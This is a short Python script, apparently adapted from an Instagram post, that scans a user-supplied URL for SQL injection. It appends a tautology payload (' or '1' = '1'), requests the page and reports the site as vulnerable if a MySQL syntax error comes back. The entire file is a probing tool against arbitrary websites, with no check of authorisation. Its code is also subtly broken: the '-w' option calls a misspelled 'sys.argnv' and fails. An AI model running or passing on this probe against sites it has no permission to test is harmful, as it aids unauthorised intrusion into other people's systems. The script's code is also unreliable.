import sys #Library relating to the Python interpreter.
import urllib #Package for opening and reading URL's.
import urllib.request

fullurl = input("Please Specify the full vulnerable url:") #Takes the URL of the page with an SQL database.

for carg in sys.argv: #Loops through a list of command line arguments.
    if carg =="-w": #If the argument w is used.
        argnum = sys.argnv.index(carg)
        argnum += 1 #Increment the number of arguments
        fullurl = sys.argv[argnum]

resp = urllib.request.urlopen(fullurl +
                       "=1\' or \'1\' = \'1\''")
body = resp.read()
fullbody = body.decode('utf-8')

if "You have an error in your SQL syntax" in fullbody: #If there's an error in the SQL syntax, making it vulnerable to SQL injection:
    print("The website is classic SQL injection vulnerable!") #Alert the user.
else: #Otherwise.
    print("The website is not classic SQL injection vulnerable!") #Tell the user that everything is fine.

"""
Please NOTE: All I've done is implemented the code from @technical_sapien 's Instagram:
https://www.instagram.com/p/CHVDdjVgyS5/?utm_source=ig_web_copy_link
"""
